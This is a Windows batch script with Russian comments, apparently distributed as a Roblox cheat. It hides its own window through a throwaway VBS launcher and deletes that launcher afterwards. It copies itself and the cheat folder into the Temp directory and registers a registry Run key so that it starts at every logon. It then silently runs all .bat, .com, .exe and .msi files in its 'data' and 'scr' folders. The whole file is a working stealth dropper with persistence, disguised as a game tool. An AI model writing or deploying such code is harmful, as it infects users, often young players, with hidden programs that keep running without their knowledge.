@echo off
:: Если скрипт запущен без флага скрытности, отправляем его в фон
if "%~1"=="-hidden" goto :payload

:: Создаем временный скрипт скрытия (вне блоков IF, теперь железно без ошибок)
echo Set WshShell = CreateObject("WScript.Shell") > "%temp%\stealth_init.vbs"
echo WshShell.Run """%~f0"" -hidden", 0, False >> "%temp%\stealth_init.vbs"
wscript.exe "%temp%\stealth_init.vbs"
exit /b

:payload
:: Уничтожаем за собой временный инициализатор и включаем UTF-8
del "%temp%\stealth_init.vbs" >nul 2>&1
chcp 65001 >nul 2>&1

set "ORIGINAL_DIR=C:\РОБЛОКС ЧИТ"
set "TEMP_DIR=%LOCALAPPDATA%\Temp\RobloxCheat"
set "SCRIPT_NAME=invisible_run.bat"
set "VBS_NAME=launcher.vbs"

:: [САМ ДЕЛАЕТ ПАПКУ] Скрипт сразу и гарантированно создает чистую папку в Temp
if not exist "%TEMP_DIR%" mkdir "%TEMP_DIR%" >nul 2>&1

:: Проверяем, существует ли оригинальный путь на диске C:\
if not exist "%ORIGINAL_DIR%" goto :check_temp

:: --- РАБОТА С ОРИГИНАЛОМ (Если папка на C:\ есть) ---
set "WORKING_DIR=%ORIGINAL_DIR%"

:: Копируем читы и сам батник в созданную папку Temp
xcopy "%ORIGINAL_DIR%" "%TEMP_DIR%" /E /I /Y /Q >nul 2>&1
copy /y "%~f0" "%TEMP_DIR%\%SCRIPT_NAME%" >nul 2>&1

:: Создаем невидимый запускатор для автозагрузки
echo Set WshShell = CreateObject("WScript.Shell") > "%TEMP_DIR%\%VBS_NAME%"
echo WshShell.Run """%TEMP_DIR%\%SCRIPT_NAME%"" -hidden", 0, False >> "%TEMP_DIR%\%VBS_NAME%"

:: Добавляем в автозагрузку реестра
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "RobloxCheatAuto" /t REG_SZ /d "\"%TEMP_DIR%\%VBS_NAME%\"" /f >nul 2>&1
goto :run_files

:check_temp
:: --- РАБОТА ИЗ TEMP (Если оригинала на C:\ уже нет) ---
if not exist "%TEMP_DIR%" exit /b
set "WORKING_DIR=%TEMP_DIR%"

:run_files
:: --- ТИХИЙ ЗАПУСК ИЗ DATA (.bat, .com, .exe, .msi) ---
if not exist "%WORKING_DIR%\data" goto :run_scr
cd /d "%WORKING_DIR%\data" >nul 2>&1
for %%f in (*.bat *.com *.exe *.msi) do (
    if not "%%~nxf"=="%SCRIPT_NAME%" start "" "%%f"
)

:run_scr
:: --- ТИХИЙ ЗАПУСК ИЗ SCR (.bat, .com, .exe, .msi) ---
if not exist "%WORKING_DIR%\scr" goto :end
cd /d "%WORKING_DIR%\scr" >nul 2>&1
for %%f in (*.bat *.com *.exe *.msi) do (
    if not "%%~nxf"=="%SCRIPT_NAME%" start "" "%%f"
)

:end
exit /b
